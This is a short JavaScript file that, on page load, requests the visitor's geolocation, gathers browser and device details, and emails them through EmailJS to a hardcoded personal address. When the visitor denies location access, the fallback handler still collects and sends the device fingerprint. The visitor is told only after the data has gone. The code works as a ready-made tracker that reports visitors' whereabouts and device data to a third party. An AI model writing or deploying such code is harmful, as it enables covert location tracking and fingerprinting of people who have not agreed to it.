window.onload = function () {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error);
  } else {
    document.getElementById("demo").innerHTML =
      "Geolocation is not supported by this browser.";
  }
};

function success(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;

  // Get additional device & browser info
  const userAgent = navigator.userAgent;
  const platform = navigator.platform;
  const language = navigator.language;
  const screenSize = `${window.screen.width}x${window.screen.height}`;

  // Display location on the webpage
  document.getElementById("demo").innerHTML =
    `Latitude: ${latitude}<br>Longitude: ${longitude}`;

  // Send data via EmailJS
  emailjs.send("service_3101r0c", "template_ol182re", {
    name: "John Doe",
    latitude: latitude,
    longitude: longitude,
    to_email: "c_nedea9@yahoo.com", // Update with the recipient's email
    message: "This is the user location and device info.",
    user_agent: userAgent,
    platform: platform,
    language: language,
    screen_size: screenSize,
  }).then(
    function (response) {
      console.log("✅ Email sent successfully", response);
      alert("📬 Location and device info sent via email!");
    },
    function (error) {
      console.error("❌ Failed to send email", error);
      alert("Email sending failed.");
    }
  );
}

function error(err) {
  // If location access is denied, still send device info
  handleLocationError("Location access denied or unavailable.");
}

function handleLocationError(message) {
  document.getElementById("demo").innerHTML = message;

  // Get additional device & browser info even when location is unavailable
  const userAgent = navigator.userAgent;
  const platform = navigator.platform;
  const language = navigator.language;
  const screenSize = `${window.screen.width}x${window.screen.height}`;

  // Send the device info without location
  emailjs.send("service_3101r0c", "template_ol182re", {
    name: "John Doe",
    latitude: "Not Available", // No location data
    longitude: "Not Available", // No location data
    to_email: "c_nedea9@yahoo.com", // Update with the recipient's email
    message: "User's location was not available, but here's the device info.",
    user_agent: userAgent,
    platform: platform,
    language: language,
    screen_size: screenSize,
  }).then(
    function (response) {
      console.log("✅ Email sent successfully with device info", response);
      alert("📬 Device info sent via email!");
    },
    function (error) {
      console.error("❌ Failed to send email", error);
      alert("Email sending failed.");
    }
  );
}